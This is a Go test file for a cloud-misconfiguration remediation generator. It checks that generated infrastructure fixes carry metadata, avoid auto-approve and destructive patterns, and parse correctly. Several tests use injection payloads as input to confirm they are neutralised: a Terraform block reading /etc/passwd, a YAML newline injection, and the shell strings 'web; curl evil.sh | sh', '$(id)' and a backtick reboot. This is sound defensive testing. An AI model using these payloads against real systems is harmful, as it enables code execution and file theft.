package remediation

import (
	"context"
	"encoding/json"
	"io/fs"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/DreadpiratePickles/nimbus/internal/catalog"
	"github.com/DreadpiratePickles/nimbus/internal/iac"
	"github.com/DreadpiratePickles/nimbus/internal/model"
	"github.com/DreadpiratePickles/nimbus/internal/store"
	"github.com/hashicorp/hcl/v2"
	"github.com/hashicorp/hcl/v2/hclsyntax"
	"gopkg.in/yaml.v3"
)

type rendered struct {
	id     string
	format Format
	fix    *Fix
}

func sampleFinding(id string, e *catalog.Entry, name string, attrs map[string]any) model.Finding {
	if attrs == nil {
		attrs = map[string]any{"vpc_id": "vpc-1", "namespace": "prod", "resource_group": "rg1"}
	}
	return model.Finding{CanonicalID: id, Provider: e.Provider, Severity: e.Severity, Status: model.Fail, Account: "123456789012", Region: "us-east-1", Source: "test",
		Resource: model.Resource{ID: "arn:aws:x:us-east-1:123456789012:thing/" + name, Name: name, Type: e.ResourceType, Attributes: attrs}}
}

// renderAll renders every catalog template once with resource name `name`.
func renderAll(t *testing.T, name string) []rendered {
	t.Helper()
	cat := catalog.Default()
	var out []rendered
	for _, id := range cat.IDs() {
		e, _ := cat.Get(id)
		for _, f := range Formats(id) {
			fix, err := Generate(sampleFinding(id, e, name, nil), f)
			if err != nil {
				t.Fatalf("%s %s: %v", id, f, err)
			}
			out = append(out, rendered{id, f, fix})
		}
	}
	return out
}

// ---------------------------------------------------------------- O26: metadata schema

func TestEveryTemplateHasCompleteMetadata(t *testing.T) {
	tpls := Templates()
	if len(tpls) < 42 {
		t.Fatalf("expected >= 42 templates, got %d", len(tpls))
	}
	have := map[string]bool{}
	for _, name := range tpls {
		have[name] = true
		m, err := TemplateMetadata(name)
		if err != nil {
			t.Errorf("%v", err)
			continue
		}
		// Values may reach the SQL only through sqlstr over the raw finding (.F).
		for _, act := range regexp.MustCompile(`\{\{-?\s*([^}]*?)\s*-?\}\}`).FindAllStringSubmatch(m.Validation.SQL, -1) {
			if !strings.HasPrefix(act[1], "sqlstr .F.") {
				t.Errorf("%s: validation.sql action {{%s}} must be `sqlstr .F.<field>`", name, act[1])
			}
		}
	}
	ents, _ := fs.ReadDir(templateFS, "templates")
	for _, e := range ents {
		if base, ok := strings.CutSuffix(e.Name(), metaSuffix); ok && !have[base] {
			t.Errorf("orphan metadata %s", e.Name())
		}
	}
}

func TestMetadataSchemaRejectsMissingFields(t *testing.T) {
	f := false
	full := Metadata{ActionsRequired: []string{"s3:PutBucketAcl"}, Validation: Validation{SQL: "SELECT 1", Expect: "no_rows"}, Mitigation: "m", Effort: "S", Confidence: "high", Rollback: "r", BreaksFunction: BreaksFunction{Value: &f, Note: "n"}}
	if err := full.Validate(); err != nil {
		t.Fatalf("complete metadata rejected: %v", err)
	}
	for name, mut := range map[string]func(m *Metadata){
		"actions":    func(m *Metadata) { m.ActionsRequired = nil },
		"wildcard":   func(m *Metadata) { m.ActionsRequired = []string{"*"} },
		"sql":        func(m *Metadata) { m.Validation.SQL = "" },
		"expect":     func(m *Metadata) { m.Validation.Expect = "" },
		"mitigation": func(m *Metadata) { m.Mitigation = "" },
		"effort":     func(m *Metadata) { m.Effort = "XL" },
		"confidence": func(m *Metadata) { m.Confidence = "sure" },
		"rollback":   func(m *Metadata) { m.Rollback = " " },
		"breaks":     func(m *Metadata) { m.BreaksFunction.Value = nil },
		"note":       func(m *Metadata) { m.BreaksFunction.Note = "" },
	} {
		m := full
		mut(&m)
		if m.Validate() == nil {
			t.Errorf("%s: missing/invalid field accepted", name)
		}
	}
}

func TestFixExposesMetadata(t *testing.T) {
	for _, r := range renderAll(t, "my-res") {
		if r.fix.Metadata == nil {
			t.Errorf("%s %s: no metadata on Fix", r.id, r.format)
			continue
		}
		b, _ := json.Marshal(r.fix)
		for _, k := range []string{`"actions_required"`, `"validation"`, `"mitigation"`, `"effort"`, `"confidence"`, `"rollback"`, `"breaks_function"`, `"steps"`} {
			if !strings.Contains(string(b), k) {
				t.Errorf("%s %s: JSON lacks %s", r.id, r.format, k)
			}
		}
	}
}

// Every validation query runs on the real store through the read-only path: zero rows while the
// resource is clean, at least one row while the finding is still failing.
func TestValidationSQLRunsOnStore(t *testing.T) {
	st, err := store.Open(filepath.Join(t.TempDir(), "p.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer st.Close()
	cat := catalog.Default()
	ctx := context.Background()
	for _, r := range renderAll(t, "it's-res") { // quote in the name exercises sqlstr
		if r.fix.Metadata == nil {
			continue
		}
		q := r.fix.Metadata.Validation.SQL
		res, err := st.QueryReadOnly(ctx, q, store.ReadOnlyOptions{Timeout: 5 * time.Second})
		if err != nil {
			t.Errorf("%s %s: %v\n%s", r.id, r.format, err, q)
			continue
		}
		if len(res.Rows) != 0 {
			t.Errorf("%s %s: clean store returned rows", r.id, r.format)
		}
		e, _ := cat.Get(r.id)
		f := sampleFinding(r.id, e, "it's-res", nil)
		f.CheckID = "test-" + r.id
		f.Finalize(time.Now())
		if err := st.UpsertFindings([]model.Finding{f}); err != nil {
			t.Fatal(err)
		}
		res, err = st.QueryReadOnly(ctx, q, store.ReadOnlyOptions{Timeout: 5 * time.Second})
		if err != nil || len(res.Rows) == 0 {
			t.Errorf("%s %s: failing finding not detected by validation (%v)\n%s", r.id, r.format, err, q)
		}
		if _, err := st.DB().Exec("DELETE FROM findings"); err != nil {
			t.Fatal(err)
		}
	}
}

// ---------------------------------------------------------------- defect 6: never auto-approve

func TestNoGeneratedCommandAutoApproves(t *testing.T) {
	all := renderAll(t, "my-res")
	for _, f := range []Format{Terraform, CloudFormation, Kubernetes, Bicep} {
		g, err := Generate(model.Finding{CanonicalID: "OKTA_NO_MFA_POLICY", Resource: model.Resource{Name: "p"}}, f)
		if err != nil {
			t.Fatal(err)
		}
		all = append(all, rendered{"generic", f, g})
	}
	for _, r := range all {
		text := r.fix.Apply + "\n" + strings.Join(r.fix.Steps, "\n") + "\n" + r.fix.Content
		if strings.Contains(text, "auto-approve") {
			t.Errorf("%s %s: auto-approve in output", r.id, r.format)
		}
		if len(r.fix.Steps) < 3 || r.fix.Steps[0] != r.fix.Apply {
			t.Errorf("%s %s: want plan → review → apply steps starting with Apply, got %q", r.id, r.format, r.fix.Steps)
		}
		var wantFirst string
		switch r.format {
		case Terraform:
			wantFirst = "terraform plan"
		case CloudFormation:
			wantFirst = "--no-execute-changeset"
		case Bicep:
			wantFirst = "what-if"
		case Kubernetes:
			if !strings.Contains(r.fix.Apply, "--dry-run=server") && !strings.HasPrefix(r.fix.Apply, "kubectl diff") {
				t.Errorf("%s: kubernetes first step must be a server dry-run or diff: %s", r.id, r.fix.Apply)
			}
			continue
		}
		if !strings.Contains(r.fix.Apply, wantFirst) || strings.Contains(r.fix.Apply, "terraform apply") || strings.Contains(r.fix.Apply, "deployment group create") {
			t.Errorf("%s %s: first step must only plan (%s): %s", r.id, r.format, wantFirst, r.fix.Apply)
		}
	}
}

// ---------------------------------------------------------------- defect 6: destructive patterns

var destructive = []struct {
	re   *regexp.Regexp
	why  string
	code bool // only checked on non-comment lines
}{
	{regexp.MustCompile(`auto-approve`), "applies without review", false},
	{regexp.MustCompile(`force_destroy\s*=\s*true`), "deletes bucket contents on destroy", true},
	{regexp.MustCompile(`ignore_changes\s*=\s*all`), "makes the fix a no-op after import", true},
	{regexp.MustCompile(`enableRbacAuthorization:\s*true`), "switching a vault to RBAC drops every access policy", true},
	{regexp.MustCompile(`example-bucket|TODO-external-id`), "placeholder that replaces live config", false},
	{regexp.MustCompile(`aws:MultiFactorAuthPresent`), "MFA condition locks out automation", true},
	{regexp.MustCompile(`actions\s*=\s*\[\s*"\*"\s*\]`), "wildcard action", true},
	{regexp.MustCompile(`public_network_access_enabled\s*=\s*false|publicNetworkAccess`), "disables every public endpoint, beyond the finding", true},
	{regexp.MustCompile(`(=|:)\s*\[?\s*"?0\.0\.0\.0/0`), "world-open source left or added", true},
	{regexp.MustCompile(`(default\s*=|Default:)\s*\[?\s*"?10\.0\.0\.0/8`), "guessed network range", true},
	{regexp.MustCompile(`readOnlyRootFilesystem|drop:\s*\["ALL"\]`), "hardening beyond the finding that breaks common images", true},
	{regexp.MustCompile(`(?i)delete the offending binding first`), "removes access before the replacement is verified", false},
	{regexp.MustCompile(`policyTypes:.*Egress`), "default-deny egress breaks every outbound call", true},
}

func TestTemplatesAvoidDestructivePatterns(t *testing.T) {
	for _, r := range renderAll(t, "my-res") {
		for _, line := range strings.Split(r.fix.Content, "\n") {
			trim := strings.TrimSpace(line)
			comment := strings.HasPrefix(trim, "#") || strings.HasPrefix(trim, "//")
			for _, d := range destructive {
				if d.code && comment {
					continue
				}
				if d.re.MatchString(line) {
					t.Errorf("%s (%s): %s: %q", r.fix.Template, r.id, d.why, trim)
				}
			}
		}
	}
}

// ---------------------------------------------------------------- generated Terraform is valid

func TestTerraformTemplatesParseAndDeclareSymbols(t *testing.T) {
	for _, name := range []string{"my-res", `evil" } resource "null_resource" "pwn" { x = "${file("/etc/passwd")}` + "\n" + `#`} {
		for _, r := range renderAll(t, name) {
			if r.format != Terraform {
				continue
			}
			und, err := iac.UndeclaredSymbols([]byte(r.fix.Content), r.fix.FileName)
			if err != nil {
				t.Errorf("%s: does not parse: %v\n%s", r.fix.Template, err, r.fix.Content)
				continue
			}
			if len(und) > 0 {
				t.Errorf("%s: undeclared %v", r.fix.Template, und)
			}
			f, _ := hclsyntax.ParseConfig([]byte(r.fix.Content), "x.tf", hcl.Pos{Line: 1, Column: 1})
			for _, b := range f.Body.(*hclsyntax.Body).Blocks {
				if len(b.Labels) > 0 && b.Labels[0] == "null_resource" {
					t.Errorf("%s: resource name injected a block", r.fix.Template)
				}
			}
		}
	}
}

// ---------------------------------------------------------------- the three rewritten templates

func gen(t *testing.T, id string, attrs map[string]any) string {
	t.Helper()
	e, _ := catalog.Default().Get(id)
	fix, err := Generate(sampleFinding(id, e, "ops-admin", attrs), Terraform)
	if err != nil {
		t.Fatal(err)
	}
	return fix.Content
}

func TestIAMAdminPolicyKeepsFunction(t *testing.T) {
	out := gen(t, "IAM_ADMIN_POLICY", map[string]any{"observed_actions": []any{"s3:GetObject", "ec2:Describe*"}})
	for _, want := range []string{`actions   = var.ops_admin_allowed_actions`, `default     = ["s3:GetObject", "ec2:Describe*"]`, `ignore_changes = [name`, "TODO", "set-default-policy-version"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q\n%s", want, out)
		}
	}
	if strings.Contains(out, "s3:ListBucket") {
		t.Errorf("placeholder action list still present")
	}
	if noObs := gen(t, "IAM_ADMIN_POLICY", map[string]any{}); regexp.MustCompile(`(?s)allowed_actions" \{[^}]*default`).MatchString(noObs) {
		t.Errorf("without observed actions the action list must be required (no default)")
	}
}

func TestCrossAccountTrustPreservesExistingAccounts(t *testing.T) {
	out := gen(t, "IAM_CROSS_ACCOUNT_TRUST", map[string]any{"trusted_accounts": []any{"222222222222"}, "trusted_services": []any{"ec2.amazonaws.com"}})
	for _, want := range []string{`["222222222222"]`, `["ec2.amazonaws.com"]`, `dynamic "condition"`, "get-role"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q\n%s", want, out)
		}
	}
}

func TestSGTemplateRemovesWorldOpenRule(t *testing.T) {
	out := gen(t, "EC2_SG_OPEN_SSH", map[string]any{})
	for _, want := range []string{"import {", "_open_rule_id_22", "cidr_ipv4         = var.ops_admin_allowed_cidrs[0]", "sgr-"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q\n%s", want, out)
		}
	}
	if strings.Contains(out, `resource "aws_security_group" `) {
		t.Errorf("template must not adopt/rewrite the whole security group")
	}
	if regexp.MustCompile(`(?s)allowed_cidrs" \{[^}]*default`).MatchString(out) {
		t.Errorf("allowed_cidrs must be required (no default)")
	}
}

// CloudFormation and Kubernetes templates must render to valid YAML (every document).
func TestYAMLTemplatesParse(t *testing.T) {
	for _, name := range []string{"my-res", "evil\nkind: Secret"} {
		for _, r := range renderAll(t, name) {
			if r.format != CloudFormation && r.format != Kubernetes {
				continue
			}
			dec := yaml.NewDecoder(strings.NewReader(r.fix.Content))
			docs := 0
			for {
				var n yaml.Node
				err := dec.Decode(&n)
				if err != nil {
					if err.Error() != "EOF" {
						t.Errorf("%s (%q): invalid YAML: %v\n%s", r.fix.Template, name, err, r.fix.Content)
					}
					break
				}
				docs++
			}
			if docs == 0 {
				t.Errorf("%s: no YAML document", r.fix.Template)
			}
			if strings.Contains(r.fix.Content, "\nkind: Secret") {
				t.Errorf("%s: newline in resource name injected a YAML key", r.fix.Template)
			}
		}
	}
}

func TestApplyCommandsQuoteResourceNames(t *testing.T) {
	evil := "web; curl evil.sh | sh"
	k, err := Generate(model.Finding{CanonicalID: "K8S_PRIVILEGED_CONTAINER", Resource: model.Resource{Name: evil, Attributes: map[string]any{"namespace": "$(id)"}}}, Kubernetes)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(k.Apply, "'web; curl evil.sh | sh'") || !strings.Contains(k.Apply, "'$(id)'") {
		t.Errorf("kubectl command not quoted: %s", k.Apply)
	}
	b, err := Generate(model.Finding{CanonicalID: "AZ_NSG_OPEN_SSH", Resource: model.Resource{Name: "nsg", Attributes: map[string]any{"resource_group": "rg`reboot`"}}}, Bicep)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(b.Apply, "'rg`reboot`'") {
		t.Errorf("az command not quoted: %s", b.Apply)
	}
}
